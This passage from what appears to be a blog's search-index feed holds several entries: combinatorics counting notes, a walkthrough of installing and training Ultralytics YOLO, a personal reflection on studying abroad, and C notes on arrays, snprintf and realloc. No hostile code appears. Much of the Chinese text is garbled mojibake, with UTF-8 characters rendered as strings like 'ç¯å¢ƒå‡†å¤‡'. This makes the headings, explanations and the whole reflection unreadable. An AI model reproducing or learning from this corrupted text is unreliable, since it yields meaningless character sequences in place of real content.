unwieldy?<br>Other techniques for obtaining an exact count:</p><ul><li>Find a different approach for counting</li><li>Make use of symmetries</li><li>Make use of recursion</li><li>Write a program (running time?)</li></ul><h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example"></a>Example</h2><p>How many sequences of 15 coin flips have an even number of heads?</p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-45-22.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-45-37.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-45-51.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-06.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-14.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-28.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-39.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-47-00.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-47-06.png" alt></p><h1 id="Difficult-Counting-Problems-not-assessed"><a href="#Difficult-Counting-Problems-not-assessed" class="headerlink" title="Difficult Counting Problems (not assessed)"></a>Difficult Counting Problems (not assessed)</h1><h2 id="Using-Programs-to-Count"><a href="#Using-Programs-to-Count" class="headerlink" title="Using Programs to Count"></a>Using Programs to Count</h2><p>Two dice, a red die and a black die, are rolled.<br>(Note: one die, two or more dice)</p><p>Write a program to list all the pairs {(R,B) âˆ¶ R &gt; B}</p><p>Similarly, for three dice, list all triples R &gt; B &gt; G</p><p>Generally, for n dice, all of which are m-sided (n â‰¤ m), list all decreasing n-tuples</p><p>Take Notice</p><p>In order to just find the number of such n-tuples, it is not<br>necessary to list them all. One can write a recurrence relation for<br>these numbers and compute (or try to solve) it.</p><h2 id="Approximate-Counting"><a href="#Approximate-Counting" class="headerlink" title="Approximate Counting"></a>Approximate Counting</h2><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-48-34.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yolo_trainning</title>
      <link href="/2024/11/15/Python/yolo-trainning/"/>
      <url>/2024/11/15/Python/yolo-trainning/</url>
      
        <content type="html"><![CDATA[<p>Among 3rd and 5th, November, I helped others to research YOLO to distinguish pictures.</p><p>Itâ€™s a little hurry, so I pasted my original note here, please translate into English manually.</p><ul><li><a href="#ç¯å¢ƒå‡†å¤‡">ç¯å¢ƒå‡†å¤‡</a></li><li><a href="#åˆ†å‰²æ¨¡å‹çŸ¥è¯†">åˆ†å‰²æ¨¡å‹çŸ¥è¯†</a></li><li><a href="#yoloå‘½ä»¤è¡Œ">yoloå‘½ä»¤è¡Œ</a><ul><li><a href="#train">Train</a></li><li><a href="#predict">Predict</a></li><li><a href="#val">Val</a></li><li><a href="#export">Export</a></li><li><a href="#special">Special</a></li></ul></li><li><a href="#pyä»£ç ">Pyä»£ç </a><ul><li><a href="#å®Œæˆå‘½ä»¤è¡Œçš„äº‹å„¿">å®Œæˆå‘½ä»¤è¡Œçš„äº‹å„¿</a></li></ul></li><li><a href="#è®­ç»ƒæ•°æ®å’Œæ‰“æ ‡">è®­ç»ƒæ•°æ®å’Œæ‰“æ ‡</a></li><li><a href="#ç»“è®º">ç»“è®º</a></li><li><a href="#æ•°æ®æ ¼å¼åŒ–å¤„ç†">æ•°æ®æ ¼å¼åŒ–å¤„ç†</a><ul><li><a href="#1å‘å›¾ç‰‡å…¨é»‘">1.å‘ï¼šå›¾ç‰‡å…¨é»‘</a></li><li><a href="#2å‘é‡å¤è¿ç»­">2.å‘ï¼šé‡å¤è¿ç»­</a></li><li><a href="#ä½¿ç”¨cocoè¿›è¡Œè§£ç rle-maskè§£ç æ­£ç¡®">ä½¿ç”¨cocoè¿›è¡Œè§£ç ï¼Œrle->maskè§£ç æ­£ç¡®ã€‚</a></li></ul></li><li><a href="#è®­ç»ƒ">è®­ç»ƒ</a></li></ul><h1 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h1><pre><code>git clone https://github.com/ultralytics/ultralytics.git</code></pre><p>cd è¿›å…¥</p><pre><code>conda create -n py12 python=3.12</code></pre><p>ç„¶åä¼šçœ‹åˆ°è§£é‡Šå™¨ï¼ˆconda\envsè·¯å¾„ä¸‹ï¼‰</p><pre><code>E:\anaconda3\envs\py12\python.exe</code></pre><p>å¤åˆ¶åˆ°ultralyticsç›®å½•ä¸‹</p><p>pycharmæ·»åŠ pythonè§£é‡Šå™¨ py12, ç„¶ååˆ›å»ºvenvçš„åº“ç›®å½•</p><p>  pip3 install torch torchvision torchaudio</p><h1 id="ultralytics-py12-python-exe-m-pip-install"><a href="#ultralytics-py12-python-exe-m-pip-install" class="headerlink" title="(ultralytics) .\py12\python.exe -m pip install ."></a>(ultralytics) .\py12\python.exe -m pip install .</h1><p>æˆåŠŸè¿è¡Œ</p><pre><code>&gt;&gt;&gt; from ultralytics import YOLOCreating new Ultralytics Settings v0.0.6 file âœ…View Ultralytics Settings with &#39;yolo settings&#39; or at &#39;C:\Users\ranja\AppData\Roaming\Ultralytics\settings.json&#39;Update Settings with &#39;yolo settings key=value&#39;, i.e. &#39;yolo settings runs_dir=path/to/dir&#39;. For help see https://docs.ultralytics.com/quickstart/#ultralytics-setti&gt;&gt;&gt;</code></pre><h1 id="åˆ†å‰²æ¨¡å‹çŸ¥è¯†"><a href="#åˆ†å‰²æ¨¡å‹çŸ¥è¯†" class="headerlink" title="åˆ†å‰²æ¨¡å‹çŸ¥è¯†"></a>åˆ†å‰²æ¨¡å‹çŸ¥è¯†</h1><p>yoloçš„è¯†åˆ«ä¹‹ä½ è¯´çš„coco8çš„é‚£80å¤šä¸ªç‰©å“ç±»åˆ«ï¼Œä½†æ˜¯æˆ‘è¦å…·ä½“è¯†åˆ«å…¶ä¸­å‡ ä¸ªï¼Œæˆ‘è‡ªå·±å®šä¹‰ä¸ªcoco8ï¼Œè¿™æ˜¯yoloçš„coco8çš„å­é›†</p><p>yolo11n.ptä¸yolo11n-seg.ptåŒºåˆ«ï¼š</p><p>ä¸€ä¸ªåªæ˜¯æ¡†æ¡†ï¼Œå¦ä¸€ä¸ªä¼šæŠ å›¾</p><h1 id="yoloå‘½ä»¤è¡Œ"><a href="#yoloå‘½ä»¤è¡Œ" class="headerlink" title="yoloå‘½ä»¤è¡Œ"></a>yoloå‘½ä»¤è¡Œ</h1><pre><code>Ultralytics yolo commands use the following syntax:</code></pre><p><strong>yolo TASK MODE ARGS</strong></p><p>TASK (optional) is one of (detect, segment, classify, pose, obb)</p><p>MODE (required) is one of (train, val, predict, export, track, benchmark)</p><p>ARGS (optional) are arg=value pairs like imgsz=640 that override defaults.</p><p>See all ARGS in the full Configuration Guide or with the yolo cfg CLI command.</p><h2 id="Train"><a href="#Train" class="headerlink" title="Train"></a>Train</h2><p>Train a detection model for 10 epochs with an initial learning_rate of 0.01</p><pre><code>yolo train data=coco8.yaml model=yolo11n.pt epochs=10 lr0=0.01</code></pre><p>epochsæ˜¯è®­ç»ƒè½®æ•°ï¼Œè¿‡åº¦è®­ç»ƒä¼šå¯¼è‡´åœ¨è®­ç»ƒæ•°æ®çš„è¿‡äºæ‹Ÿåˆï¼Œåœ¨è®­ç»ƒæ•°æ®ä¸Šè¡¨ç°è‰¯å¥½ï¼Œä½†æ˜¯æµ‹è¯•æ•°æ®ä¸Šè¡¨ç°ä¸å¥½</p><p>lræ˜¯å­¦ä¹ ç‡</p><ul><li>è¿‡é«˜çš„å­¦ä¹ ç‡ï¼šå¯èƒ½å¯¼è‡´è®­ç»ƒä¸ç¨³å®šï¼Œç”šè‡³æ— æ³•æ”¶æ•›ï¼ˆå³æ¨¡å‹æ— æ³•è¾¾åˆ°ç†æƒ³çš„å‡†ç¡®ç‡ï¼‰ã€‚</li><li>è¿‡ä½çš„å­¦ä¹ ç‡ï¼šå¯èƒ½å¯¼è‡´è®­ç»ƒé€Ÿåº¦å¤ªæ…¢ï¼Œæˆ–è€…åœ¨å±€éƒ¨æœ€ä¼˜è§£å¾˜å¾Šã€‚</li></ul><h2 id="Predict"><a href="#Predict" class="headerlink" title="Predict"></a>Predict</h2><p>Predict a YouTube video using a pretrained segmentation model at image size 320:</p><pre><code>yolo predict model=yolo11n-seg.pt source=&#39;https://youtu.be/LNwODJXcvt4&#39; imgsz=320</code></pre><p>ä¼šä»å®˜ç½‘ä¸‹è½½é‚£ä¸ªptæ–‡ä»¶ï¼Œä¼šè§£æé‚£ä¸ªyoutubeè§†é¢‘æµ</p><p><a href="https://github.com/ultralytics/yolov5/releases/download/v{version}/{model}.pt">https://github.com/ultralytics/yolov5/releases/download/v{version}/{model}.pt</a></p><p><a href="https://github.com/ultralytics/yolov5/releases/download/v7.0/yolov5s.pt">https://github.com/ultralytics/yolov5/releases/download/v7.0/yolov5s.pt</a></p><p>å¦‚æœè‡ªå®šä¹‰ptï¼Œå¯ä»¥ç›´æ¥æŒ‡å®šè·¯å¾„</p><pre><code>model=&#39;/path/to/your_custom_model.pt&#39;</code></pre><h2 id="Val"><a href="#Val" class="headerlink" title="Val"></a>Val</h2><p>Val a pretrained detection model at batch-size 1 and image size 640:</p><p>éªŒè¯é›†æ˜¯ä¸€ä¸ªç‹¬ç«‹äºè®­ç»ƒé›†çš„æ•°æ®å­é›†ï¼Œç”¨äºæµ‹è¯•æ¨¡å‹åœ¨æœªè§æ•°æ®ä¸Šçš„è¡¨ç°ã€‚é€šè¿‡å¯¹éªŒè¯é›†è¿›è¡Œè¯„ä¼°ï¼Œå¯ä»¥è·å–æ¨¡å‹çš„å‡†ç¡®æ€§ã€å¬å›ç‡ã€F1-score å’Œ mAPï¼ˆmean Average Precisionï¼‰ç­‰æŒ‡æ ‡ã€‚</p><p>yolo val model=yolo11n.pt data=coco8.yaml batch=1 imgsz=640</p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-19-40.png" alt></p><h2 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h2><p>Export a yolo11n classification model to ONNX format at image size 224 by 128 (no TASK required)</p><pre><code>yolo export model=yolo11n-cls.pt format=onnx imgsz=224,128</code></pre><p>å¯¼å‡ºæ¨¡å‹</p><p><strong>format=onnx</strong>ï¼šè¿™è¡¨æ˜å¯¼å‡ºçš„æ ¼å¼æ˜¯ ONNXï¼ˆOpen Neural Network Exchangeï¼‰ï¼Œè¿™æ˜¯ä¸€ç§å¼€æ”¾çš„æ·±åº¦å­¦ä¹ æ¨¡å‹æ ¼å¼ï¼Œç”¨äºåœ¨ä¸åŒçš„æ¡†æ¶å’Œå¹³å°ä¹‹é—´å…±äº«å’Œä½¿ç”¨æ¨¡å‹ã€‚<br><strong>imgsz=224,128</strong>ï¼šæŒ‡å®šè¾“å…¥å›¾åƒçš„å°ºå¯¸ä¸º 224 åƒç´ ï¼ˆå®½ï¼‰å’Œ 128 åƒç´ ï¼ˆé«˜ï¼‰ã€‚è¿™æ„å‘³ç€åœ¨å¯¼å‡ºæ—¶ï¼Œæ¨¡å‹ä¼šè°ƒæ•´å…¶è¾“å…¥å±‚çš„å¤§å°ï¼Œä»¥é€‚åº”è¿™ä¸€ç‰¹å®šçš„å›¾åƒå°ºå¯¸ã€‚æ­¤å‚æ•°ç¡®ä¿å½“æ‚¨ä½¿ç”¨å¯¼å‡ºçš„æ¨¡å‹æ—¶ï¼Œè¾“å…¥å›¾åƒçš„å°ºå¯¸ç¬¦åˆè¦æ±‚ã€‚</p><h2 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h2><p>Run special commands to see version, view settings, run checks and more:</p><pre><code>yolo helpyolo checksyolo versionyolo settingsyolo copy-cfgyolo cfg</code></pre><h1 id="Pyä»£ç "><a href="#Pyä»£ç " class="headerlink" title="Pyä»£ç "></a>Pyä»£ç </h1><h2 id="å®Œæˆå‘½ä»¤è¡Œçš„äº‹å„¿"><a href="#å®Œæˆå‘½ä»¤è¡Œçš„äº‹å„¿" class="headerlink" title="å®Œæˆå‘½ä»¤è¡Œçš„äº‹å„¿"></a>å®Œæˆå‘½ä»¤è¡Œçš„äº‹å„¿</h2><pre><code>from ultralytics import YOLO# Create a new YOLO model from scratchmodel = YOLO(&quot;yolo11n.yaml&quot;)# Load a pretrained YOLO model (recommended for training)model = YOLO(&quot;yolo11n.pt&quot;)# Train the model using the &#39;coco8.yaml&#39; dataset for 3 epochsresults = model.train(data=&quot;coco8.yaml&quot;, epochs=3)# Evaluate the model&#39;s performance on the validation setresults = model.val()# Perform object detection on an image using the modelresults = model(&quot;https://ultralytics.com/images/bus.jpg&quot;)# Export the model to ONNX formatsuccess = model.export(format=&quot;onnx&quot;)</code></pre><h1 id="è®­ç»ƒæ•°æ®å’Œæ‰“æ ‡"><a href="#è®­ç»ƒæ•°æ®å’Œæ‰“æ ‡" class="headerlink" title="è®­ç»ƒæ•°æ®å’Œæ‰“æ ‡"></a>è®­ç»ƒæ•°æ®å’Œæ‰“æ ‡</h1><p><a href="https://github.com/Incalos/YOLO-Datasets-And-Training-Methods/blob/master/README_CN.md">https://github.com/Incalos/YOLO-Datasets-And-Training-Methods/blob/master/README_CN.md</a></p><pre><code>pip install labelimglabelimg</code></pre><p>å‘½ä»¤ç›´æ¥å¯åŠ¨labelimg</p><h1 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h1><pre><code>https://www.kaggle.com/code/creazyeeeeli/acsnansck#Traininghttps://docs.ultralytics.com/models/yolov8/#performance-metrics</code></pre><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-22-21.png" alt></p><h1 id="æ•°æ®æ ¼å¼åŒ–å¤„ç†"><a href="#æ•°æ®æ ¼å¼åŒ–å¤„ç†" class="headerlink" title="æ•°æ®æ ¼å¼åŒ–å¤„ç†"></a>æ•°æ®æ ¼å¼åŒ–å¤„ç†</h1><p>RLEè½¬mask</p><p>æœ€å¼€å§‹çœ‹ç€é‚£ä¸ªRLEæ•°æ®ï¼Œæ˜¯å¥‡æ•°ä¸ªï¼Œè€Œéå¶æ•°ä¸ªï¼Œæœ€å¼€å§‹ä»¥ä¸ºRLEå‡ºé”™äº†ã€‚<br>åæ¥æé¡ºæƒ³åˆ°ï¼Œå¯èƒ½æ˜¯â€œå‰æ™¯ï¼ŒèƒŒæ™¯ï¼Œå‰æ™¯ï¼ŒèƒŒæ™¯ã€‚ã€‚ã€‚â€è¿™æ ·äº¤æ›¿ä¸‹æ¥çš„åƒç´ </p><p>ç„¶åæˆ‘è§‰å¾—åº”è¯¥æ˜¯å¯¹çš„ï¼Œäºæ˜¯å†™äº†ä¸ªè„šæœ¬ï¼š<br>ä¸€ä¸ªå›¾ç‰‡å¯¹åº”å¤šä¸ªsegmentsï¼Œå› æ­¤æ¯ä¸ªsegmentéƒ½æ˜¯ä¸€ä¸ªæ©ç å›¾ç‰‡ï¼Œæœ€ç»ˆæˆ‘æŠŠè¿™äº›æ©ç å›¾ç‰‡å åŠ èµ·æ¥å¾—åˆ°æœ€ç»ˆæ©ç å›¾ç‰‡ã€‚</p><h2 id="1-å‘ï¼šå›¾ç‰‡å…¨é»‘"><a href="#1-å‘ï¼šå›¾ç‰‡å…¨é»‘" class="headerlink" title="1.å‘ï¼šå›¾ç‰‡å…¨é»‘"></a>1.å‘ï¼šå›¾ç‰‡å…¨é»‘</h2><p>æœ€å¼€å§‹æˆ‘å¤„ç†æ©ç ï¼Œä¸€ç»´è½¬äºŒç»´ï¼Œéƒ½åªç”¨0ï¼Œ1è¡¨ç¤ºï¼Œç„¶åä¿å­˜æˆå›¾ç‰‡ï¼Œä½†æ˜¯æœ€ç»ˆæ‰€æœ‰å›¾ç‰‡å…¨é»‘ã€‚æˆ‘ç™¾æ€ä¸å¾—å…¶è§£ï¼Œä½†æ˜¯æœ€ç»ˆå‘ç°åŸæ¥å•é€šé“å›¾ç‰‡æ˜¯ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªåƒç´ ï¼Œæ˜¯0-255ï¼Œæœ‰ç°é˜¶çš„ï¼Œä¸æ˜¯å•çº¯çš„éé»‘å³ç™½ã€‚å› æ­¤æˆ‘ç›´æ¥ä»¤np.arrayçŸ©é˜µç‚¹ä¹˜255ï¼Œå¾—åˆ°å›¾ç‰‡ã€‚</p><h2 id="2-å‘ï¼šé‡å¤è¿ç»­"><a href="#2-å‘ï¼šé‡å¤è¿ç»­" class="headerlink" title="2.å‘ï¼šé‡å¤è¿ç»­"></a>2.å‘ï¼šé‡å¤è¿ç»­</h2><p>åº”è¯¥æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„rleæ•°æ®è½¬maskå­˜åœ¨é—®é¢˜ï¼Œæˆ‘ä»¬å†™çš„ä¸å¯¹ï¼Œå¯¼è‡´å…¶çœ‹èµ·æ¥åƒé«˜ä¸­å­¦çš„æ­£é€‰æ³¢å½¢ä¸€æ ·åœ¨å›¾ç‰‡ä¸Šé‡å¤ã€‚</p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-02.png" alt></p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-10.png" alt></p><h2 id="ä½¿ç”¨cocoè¿›è¡Œè§£ç ï¼Œrle-gt-maskè§£ç æ­£ç¡®ã€‚"><a href="#ä½¿ç”¨cocoè¿›è¡Œè§£ç ï¼Œrle-gt-maskè§£ç æ­£ç¡®ã€‚" class="headerlink" title="ä½¿ç”¨cocoè¿›è¡Œè§£ç ï¼Œrle-&gt;maskè§£ç æ­£ç¡®ã€‚"></a>ä½¿ç”¨cocoè¿›è¡Œè§£ç ï¼Œrle-&gt;maskè§£ç æ­£ç¡®ã€‚</h2><p>åæ¥é¡ºå“¥æ„è¯†åˆ°ï¼Œåº”è¯¥æœ‰å…¶ä»–åº“èƒ½è¿›è¡Œè§£ç ï¼Œç„¶åæ‰¾åˆ°äº†cocoå»è¿›è¡Œè§£ç ï¼Œæ­£ç¡®ã€‚</p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-39.png" alt></p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-50.png" alt></p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-58.png" alt></p><h1 id="è®­ç»ƒ"><a href="#è®­ç»ƒ" class="headerlink" title="è®­ç»ƒ"></a>è®­ç»ƒ</h1><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-24-11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ„Ÿæ‚Ÿ</title>
      <link href="/2024/11/03/trivia/Insights/"/>
      <url>/2024/11/03/trivia/Insights/</url>
      
        <content type="html"><![CDATA[<p>æ¥æµ·å¤–ç•™å­¦ï¼Œå·²æ˜¯å¼€å·¥æ²¡æœ‰å›å¤´ç®­ï¼šä¸å¾—ä¸å‘ï¼Œç»§è€Œå¼€å¼“æ²¡å›å¤´ç®­ï¼Œè‡ªæˆ‘å½¢æˆä¸€ä¸ªæ²¡æœ‰åº•æ´çš„PUAæ·±æ¸Šã€‚è™½ç„¶è¿‘ä¼¼å€¾æˆ‘æ¯•ç”Ÿå…¨åŠ›ä»¥èµ´ï¼Œè®¤çœŸç¨‹åº¦ç”šäºæˆ‘å›½ã€‚å­¦æµ·æ— è¾¹ï¼Œä¹¦å›Šæ— åº•ã€‚äººè ¢ï¼Œå°±å¤šåŠªåŠ›ï¼›äººå†’å¤±ï¼Œå°±å¤šè¸©å‘å¤šæ€»ç»“ç»éªŒï¼›ç¼ºä»€ä¹ˆèµ„æºï¼Œè‡ªå·±åŠ¨æ‰‹æ®µå»äº‰å–ï¼›æ¯”äººå¼±ï¼Œå°±å¤šå‘äººå®¶å­¦ä¹ ï¼›æ€•ç³Šæ¶‚ï¼Œå°±å¤šç¡è§‰ä¿è¯è„‘è¢‹æ¸…é†’ï¼›æƒ³è·å¾—ä»€ä¹ˆä¸œè¥¿æˆ–æœ¬é¢†ï¼Œå°±å»äº‰å»æƒ³å»æŠ¢å»åšã€‚å®æ„¿é€‰æ‹©å’¬ç‰™åˆ‡é½¿çš„è®©è‡ªå·±æŠ•å…¥ï¼Œä¹Ÿæ¯”è¿ç»­å‡ å¤©è‹¦å¤§ä»‡æ·±æ€¨å¤©å°¤äººè¦å¥½å¾—å¤š;å®æ„¿è¢«åˆ«äººè¯´å°–é”æ²‰é»˜å¥½å¼ºï¼Œä¹Ÿæ¯”è¢«åˆ«äººå½“æˆçœŸæ­£çš„ç…ç¬”æ— è¶£çš„å¿½è§†è¦å¼ºçš„å¤šã€‚æ—¢ç„¶æœ‰äº†ä¸Šå°çš„æœºä¼šï¼Œå°±æ²¡å¿…è¦è¯‰è‹¦æˆ–æŠ±æ€¨èµ„æºï¼Œå¤©èµ‹ï¼Œæœºä¼šï¼Œè¿æ°”ä¸å¦‚è°è°ï¼Œä¹Ÿæ²¡å¿…è¦åŸ‹æ€¨é‡åˆ°ä»€ä¹ˆæ‚ä¸ƒæ‚å…«çš„æŒ«æŠ˜ã€‚åˆ«äººå˜²è®½ï¼Œè®¥ç¬‘ï¼Œèµæ‰¬ï¼Œå’Œæˆ‘æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œçœ¼ä¸­åªæœ‰å°Šé‡è‡ªå·±ï¼ŒæŒ‘æˆ˜è‡ªå·±ï¼Œå–æ‚¦è‡ªå·±ï¼Œæ‹¾æ‡æ‹¾æ‡è¿™ç‹¼ç‹ˆçš„æ ·å­ç»§ç»­å‡ºå‘ï¼Œç»§ç»­å‰è¿›ã€‚çŠ¯çš„é”™ï¼Œä¸¢çš„åˆ†ï¼Œå¤±å»çš„ä¸œè¥¿ï¼Œç»å†çš„äº‹æ•…ï¼Œå¤±å»äº†å°±å¤±å»äº†ï¼Œå†èŠ±ç‚¹æ—¶é—´å’ŒåŠŸå¤«éª‚è‡ªå·±ï¼Œå¤šæŒ‡æ‘˜ï¼Œæˆ‘è‡ªå·±çš„å„ç§æ„šè ¢ï¼Œè‡ªå¤§ï¼Œå’Œå¿ƒæ€çˆ†ç‚¸ã€‚æ„¿ä¸‹æ¬¡å†é‡åˆ°ä¹±ä¸ƒå…«ç³Ÿçš„äº‹æ•…ï¼ŒæŒ«æŠ˜ï¼Œå†å¤šå¤šå¿ƒæ€å¹³å’Œçš„æŒ‡æ‘˜è‡ªå·±ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Declaring arrays and out of bounds</title>
      <link href="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/"/>
      <url>/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#å£°æ˜æ•°ç»„æ–¹å¼">å£°æ˜æ•°ç»„æ–¹å¼</a><ul><li><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²å…¸å‹é™æ€æ•°ç»„">æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå…¸å‹é™æ€æ•°ç»„ï¼‰</a></li><li><a href="#åŠ¨æ€å†…å­˜åˆ†é…">åŠ¨æ€å†…å­˜åˆ†é…</a></li><li><a href="#åŠ¨æ€åˆ†é…å†…å­˜è¿½åŠ æ•°ç»„é•¿åº¦realloc">åŠ¨æ€åˆ†é…å†…å­˜ï¼Œè¿½åŠ æ•°ç»„é•¿åº¦ï¼šrealloc</a></li><li><a href="#ä¸¤ç§æ–¹å¼æ¯”è¾ƒ">ä¸¤ç§æ–¹å¼æ¯”è¾ƒ</a><ul><li><a href="#é™æ€æ•°ç»„">é™æ€æ•°ç»„</a><ul><li><a href="#ä¼˜ç‚¹">ä¼˜ç‚¹</a></li><li><a href="#ç¼ºç‚¹">ç¼ºç‚¹</a></li></ul></li><li><a href="#åŠ¨æ€å†…å­˜åˆ†é…å¦‚-malloc">åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå¦‚ mallocï¼‰</a><ul><li><a href="#ä¼˜ç‚¹-1">ä¼˜ç‚¹</a></li><li><a href="#ç¼ºç‚¹-1">ç¼ºç‚¹ï¼š</a></li></ul></li></ul></li><li><a href="#å…³äºè¶Šç•Œæ“ä½œè¶Šç•Œèµ‹å€¼å’Œè®¿é—®">å…³äºè¶Šç•Œæ“ä½œï¼šè¶Šç•Œèµ‹å€¼å’Œè®¿é—®</a></li><li><a href="#æ•°ç»„é»˜è®¤å€¼">æ•°ç»„é»˜è®¤å€¼</a></li></ul></li><li><a href="#æ•°ç»„æŒ‡é’ˆåŠè®¿é—®æ–¹å¼">æ•°ç»„æŒ‡é’ˆåŠè®¿é—®æ–¹å¼</a><ul><li><a href="#å­—ç¬¦æŒ‡é’ˆå­—ç¬¦ä¸²é¦–åœ°å€å³å­—ç¬¦ä¸²æœ¬èº«">å­—ç¬¦æŒ‡é’ˆï¼ˆå­—ç¬¦ä¸²é¦–åœ°å€(å³å­—ç¬¦ä¸²æœ¬èº«)ï¼‰</a><ul><li><a href="#å¦‚å¤šåå­—æ•°ç»„èµ‹å€¼">å¦‚å¤šåå­—æ•°ç»„èµ‹å€¼</a></li></ul></li><li><a href="#ç»“æ„ä½“çš„æˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªæŒ‡é’ˆä½†æ˜¯å¯ä»¥ç›´æ¥mallocå¤šä¸ªå½“ä½œæ•°ç»„ä½¿ç”¨">ç»“æ„ä½“çš„æˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥mallocå¤šä¸ªå½“ä½œæ•°ç»„ä½¿ç”¨</a></li></ul></li></ul><h1 id="å£°æ˜æ•°ç»„æ–¹å¼"><a href="#å£°æ˜æ•°ç»„æ–¹å¼" class="headerlink" title="å£°æ˜æ•°ç»„æ–¹å¼"></a>å£°æ˜æ•°ç»„æ–¹å¼</h1><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå…¸å‹é™æ€æ•°ç»„ï¼‰"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå…¸å‹é™æ€æ•°ç»„ï¼‰" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå…¸å‹é™æ€æ•°ç»„ï¼‰"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå…¸å‹é™æ€æ•°ç»„ï¼‰</h2><pre><code>char command[(FILE_NAME_LEN+1)*4] = &#123;0&#125;;# å…¨éƒ¨å€¼ä¼šå˜ä¸º â€˜\0â€™</code></pre><pre><code>snprintf(command, FILE_NAME_LEN*4, &quot;dot -T png %s -o %s&quot;, dotFileName, pngFileName);# æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤åˆ¶</code></pre><p>å¦‚æœ<strong>è¶…è¿‡æœ€å¤§é•¿åº¦</strong>ï¼Œå¦‚<code>FILE_NAME_LEN*4</code>ï¼Œå‡½æ•°ä¸ºäº†é¿å…ç¼“å†²åŒºæº¢å‡ºé—®é¢˜ï¼Œä¼šè‡ªåŠ¨æˆªæ–­å­—ç¬¦ä¸²ï¼Œä¿è¯å®‰å…¨ã€‚</p><pre><code># graph node name èµ‹å€¼void GraphAddNode(struct Graph *pGraph, long u, char *name) &#123;    if (IsLegalNodeNum(pGraph, u)) &#123;                snprintf(pGraph-&gt;pNodes[u].name, MAX_ID_LEN, &quot;%s&quot;, name);    &#125;&#125;</code></pre><h2 id="åŠ¨æ€å†…å­˜åˆ†é…"><a href="#åŠ¨æ€å†…å­˜åˆ†é…" class="headerlink" title="åŠ¨æ€å†…å­˜åˆ†é…"></a>åŠ¨æ€å†…å­˜åˆ†é…</h2><p>ï¼ˆå¦‚ mallocï¼‰malloc( xx, sizeof(xx) <em> 1000) memset(0, sizeof(xxx)</em>1000)</p><pre><code>Type *xx = (Type *)malloc(sizeof(Type) * 1000);memset(xx, 0, sizeof(Type) * 1000);</code></pre><h2 id="åŠ¨æ€åˆ†é…å†…å­˜ï¼Œè¿½åŠ æ•°ç»„é•¿åº¦ï¼šrealloc"><a href="#åŠ¨æ€åˆ†é…å†…å­˜ï¼Œè¿½åŠ æ•°ç»„é•¿åº¦ï¼šrealloc" class="headerlink" title="åŠ¨æ€åˆ†é…å†…å­˜ï¼Œè¿½åŠ æ•°ç»„é•¿åº¦ï¼šrealloc"></a>åŠ¨æ€åˆ†é…å†…å­˜ï¼Œè¿½åŠ æ•°ç»„é•¿åº¦ï¼šrealloc</h2><p>realloc å‡½æ•°<strong>é€šå¸¸</strong>ä¼š<strong>è¿”å›ä¸ä¼ é€’ç»™å®ƒçš„æŒ‡é’ˆç›¸åŒçš„åœ°å€</strong>ï¼Œä½†è¿™å¹¶<strong>ä¸æ˜¯ä¿è¯</strong>ã€‚</p><p>å¦‚æœåŸæ¥çš„å†…å­˜æ— æ³•æ‰©å±•ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„è¿ç»­å†…å­˜ï¼‰ï¼Œrealloc 